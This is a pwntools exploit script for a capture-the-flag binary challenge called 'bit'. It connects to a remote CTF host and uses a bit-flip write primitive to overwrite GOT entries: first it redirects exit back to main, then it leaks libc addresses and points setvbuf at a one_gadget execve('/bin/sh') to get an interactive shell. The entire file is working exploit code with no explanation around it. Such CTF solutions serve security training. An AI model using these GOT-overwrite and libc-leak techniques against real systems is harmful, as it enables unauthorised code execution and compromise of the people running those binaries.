from pwn import *

got_exit = 0x804a01c
current_got = 0x080484f6
main = 0x080487e7
dummy = 0x804a040
setvbuf_call = 0x080487cd
total = 0

def flipper(curr, req):
    flips = curr ^ req
    for i in range(8):
        if flips & (1<<i):
            yield str(i)

def flip_dword(addr, curr, req):
    payload = []
    for i in range(4):
        if curr == req:
            break
        inp_addr = str(hex(addr))[2:]
        flip_bits = list(flipper(curr&0xff, req&0xff))
        addr += 1
        curr = curr >> 8
        req = req >> 8
        payload.append((inp_addr, flip_bits))

    return payload


def run_flip(flips):
    global total
    updates = []
    for faddr, fbits in flips:
        for bit in fbits:
            r.recvuntil(': ')
            r.sendline(faddr)
            r.recvuntil(': ')
            r.sendline(bit)
            r.recvuntil('new byte: ')
            updates.append(r.recvuntil('\n')[:-1])
            total += 1
    print(updates)
    return updates

def leak(addr):
    addr_str = str(hex(addr))[2:]
    leak_addr = run_flip([(addr_str, ['0', '0'])])[-1]
    print("Value at address {} is 0x{}".format(hex(addr), leak_addr.decode('utf-8')))
    return int(leak_addr, 16)


# test
print(list(flipper(0x4f6, 0x7f3)))
print(flip_dword(0x804a01c,0x080484f6, 0x080487f3))

# r = gdb.debug('./bit')
# r = process('./bit')
r = remote('pwn.hsctf.com', 4444)

flips = flip_dword(got_exit, current_got, main)
run_flip(flips)

leak(0x804a018) # puts
leak(0x804a024) # libc start main

curr_svf = leak(0x804a028)

"""
0x3ac5e execve("/bin/sh", esp+0x2c, environ) <- this one worked
constraints:
  esi is the GOT address of libc
  [esp+0x2c] == NULL

0x3ac62 execve("/bin/sh", esp+0x30, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x30] == NULL

0x3ac69 execve("/bin/sh", esp+0x34, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x34] == NULL

0x5fbc5 execl("/bin/sh", eax)
constraints:
  esi is the GOT address of libc
  eax == NULL

0x5fbc6 execl("/bin/sh", [esp])
constraints:
  esi is the GOT address of libc
  [esp] == NULL

"""

required_svf = curr_svf - 0x00060360 + 0x3ac5e
flips = flip_dword(0x804a028, curr_svf, required_svf)
run_flip(flips)
print('updated setvbuf {}'.format(hex(0x804a028)))

while total % 4 != 0:
    addr_str = str(hex(dummy))[2:]
    leak_addr = run_flip([(addr_str, ['0'])])[-1]

flips = flip_dword(got_exit, main, setvbuf_call)
run_flip(flips)

while total % 4 != 0:
    addr_str = str(hex(dummy))[2:]
    leak_addr = run_flip([(addr_str, ['0'])])[-1]

r.interactive()
